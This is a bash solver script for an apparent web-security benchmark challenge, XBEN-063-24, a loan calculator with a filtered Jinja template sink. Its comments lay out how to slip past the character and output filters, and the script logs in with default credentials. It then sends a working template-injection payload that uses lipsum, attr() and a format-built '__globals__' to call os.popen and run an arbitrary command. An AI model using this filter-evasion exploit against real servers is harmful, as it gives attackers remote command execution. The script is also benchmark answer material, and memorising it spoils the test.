#!/usr/bin/env bash
# XBEN-063-24 — "Loan Calculator - Encoding" (tags: ssti, default_credentials)
#
# The hardened XBEN-104. Same template-string sink, plus two guards:
#
#   * `principal` may not contain `{{`, `}}`, `[`, `]`, `_` or `.` — no
#     expression syntax, no subscripting, no dunder, no attribute access;
#   * after rendering, `loan_principal` is parsed back out of the JSON and must
#     match `^[0-9.]*$`, so whatever lands there has to look like a number.
#
# Both are answered by not using the place they are watching. `{% %}` is a
# statement, not an expression, so the first filter never sees it, and `{% set
# payment = … %}` rebinds the name that the *template's own* `{{ payment }}`
# placeholder prints — the output comes out of a slot the author wrote. The
# `principal` field is then left empty, and an empty string matches `^[0-9.]*$`.
#
# Inside the statement, `|attr()` replaces the dot and `"%c"|format(95)` builds
# the underscore that `__globals__` needs, so no forbidden character is typed.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben063-$$"
COMMAND="${2:-cat /flag}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

payload='{% set u = "%c"|format(95) %}'
payload+='{% set g = u~u~"globals"~u~u %}'
payload+="{% set payment = lipsum|attr(g)|attr(\"get\")(\"os\")|attr(\"popen\")(\"$COMMAND\")|attr(\"read\")() %}"

"$H5I" browser open "$URL/login" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=test' --set 'form.password=test' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'path=/total_loan_payments' \
    --set "query.principal=$payload" --set 'query.payment=1' --set 'query.term=1' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
